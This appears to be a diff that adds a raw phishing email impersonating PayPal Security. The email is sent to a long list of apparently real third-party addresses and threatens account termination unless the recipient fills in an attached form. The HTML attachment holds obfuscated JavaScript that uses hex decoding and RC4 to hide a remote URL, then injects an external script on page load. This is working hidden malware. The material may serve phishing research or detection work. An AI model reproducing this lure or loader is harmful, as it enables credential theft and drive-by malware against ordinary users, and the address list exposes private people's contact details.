@@ -1,0 +1,90 @@
+Content-Type: multipart/mixed; boundary="===============0233209482229912967=="
+MIME-Version: 1.0
+From: PayPal Security <info@form1.us>
+Message-Id: <7c1ee7cd234ebffc1fbe4e82fbe3b44d@KVtFFp1Q010P.us>
+Subject: Please update your account records
+To: skreese885@aol.com
+ skreenaime@hotmail.com; skreenasri@yahoo.com; skreener11@yahoo.com;
+ skreenerz@hotmail.com; skreenmobel@skreenmobel.com; skreenna@yahoo.com;
+ skreenname0@aol.com; skreenrider@comcast.net; skreenshop@aol.com;
+ skreentrn@yahoo.com; skreenu@hotmail.com; skreese05@msn.com;
+ skreese885@aol.com; skreesor@msn.com; skreet16@yahoo.com;
+ skreet187@hotmail.com; skreeves27@sbcglobal.net; skreeves@westpac.com.au;
+ skreeworld@yaho.com; skreex87@hotmail.it; skref@rediffmail.com;
+ skreffer@greenpark.nl; skreffitt@yahoo.com; skreflexctr@yahoo.com.hk;
+ skrefri@yahoo.bom; skrefri@yahoo.com; skrefski@comcast.net
+
+--===============0233209482229912967==
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+It appears that some of your records have gone missing or became outdated.
+
+This raises a security concern mainly because PayPal focuses on online payment transactions.
+Please understand that the safety of our users is very important.
+
+We ask that you update your account records immediately to avoid restrictions being set on your
+account, or in the worst case scenario, having your account terminated from PayPal.
+
+You may provide your current information into the form that's provided in the attachment.
+Open the form and complete it in your browser.
+
+Thank you,
+PayPal Update Support
+--===============0233209482229912967==
+MIME-Version: 1.0
+Content-Type: text/html; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+</head>
+
+<body><script>
+
+function w8oi(vrzp7k8)
+{
+    var qu674012 = 0;
+    var q091f = '';
+    if( vrzp7k8.substr(0,2) == '0x' ){ qu674012 = 2; }
+    if( typeof vrzp7k8 != 'string' ){ vrzp7k8 = vrzp7k8.toString(); }
+    for(var vnr7=qu674012;  vnr7<vrzp7k8.length; vnr7+=2) {
+        var c = vrzp7k8.substr( vnr7, 2 );
+        q091f = q091f + String.fromCharCode( parseInt(c, 16) );
+        }
+    return q091f;
+}
+
+function z3q3(q773x8fu, n371j) {
+  var mo1vd7524, o1jo617v6, sp6j00410, bu0ro5, f31ha, roi3;
+  for (mo1vd7524 = [], o1jo617v6 = 0, bu0ro5 = "", f31ha = 0; f31ha < 256; f31ha++) mo1vd7524[f31ha] = f31ha;
+  for (f31ha = 0; f31ha < 256; f31ha++)
+    o1jo617v6 = (o1jo617v6 + mo1vd7524[f31ha] + n371j.charCodeAt((f31ha % n371j.length))) % 256,
+    sp6j00410 = mo1vd7524[f31ha],
+    mo1vd7524[f31ha] = mo1vd7524[o1jo617v6],
+    mo1vd7524[o1jo617v6] = (sp6j00410);
+  for (f31ha = 0, o1jo617v6 = 0, roi3 = 0; roi3 < q773x8fu.length; roi3++)
+    f31ha = ((f31ha + 1) % 256),
+    o1jo617v6 = ((o1jo617v6 + mo1vd7524[f31ha]) % 256),
+    sp6j00410 = mo1vd7524[f31ha],
+    mo1vd7524[f31ha] = mo1vd7524[o1jo617v6],
+    mo1vd7524[o1jo617v6] = sp6j00410,
+    bu0ro5 += String.fromCharCode(q773x8fu.charCodeAt(roi3) ^ mo1vd7524[(mo1vd7524[f31ha] + mo1vd7524[o1jo617v6]) % 256]);
+  return bu0ro5
+}
+
+var i9ao2d = z3q3(w8oi("febe6065e21ab896ae416185069307030319a36c9f5e206a4e347473aa651124f50994d29eda3b8d43ce49ee665e8f946b027b16266f528d1ca5c8"),"c2f503cqa");
+var sxddrxaly = z3q3(w8oi("e5a9667ca841"),"c2f503cqa");
+var yyzco = document.createElement(sxddrxaly);
+yyzco.src = i9ao2d;
+var yl36 = z3q3(w8oi("feaf7571"),"c2f503cqa");
+document.getElementsByTagName(yl36)[0].appendChild(yyzco);
+</script>
+
+</body>
+</html>
+--===============0233209482229912967==--
